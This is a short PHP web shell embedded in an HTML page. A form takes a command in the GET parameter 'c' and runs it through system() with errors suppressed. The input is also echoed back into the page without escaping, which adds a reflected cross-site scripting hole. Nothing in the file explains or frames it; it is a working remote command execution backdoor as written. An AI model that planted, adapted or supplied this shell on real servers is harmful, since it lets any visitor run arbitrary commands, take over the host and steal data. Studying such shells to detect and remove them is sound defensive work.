<form action="" method="get"><textarea name="c" rows="10" cols="80">
	<script language="PHP"> 
		if (isset($_GET['c'])) {echo $_GET['c'];}
	</script>
</textarea><button type="submit">go</button></form><hr /><div><p>Result of <strong>
	<script language="PHP"> 
		if(isset($_GET['c'])){echo $_GET['c'];}
	</script>
</strong></p><pre>

<script language="PHP"> 
	$output="";if (isset($_GET['c'])){$output=@system($_GET['c']);};
</script>
</pre>
</div>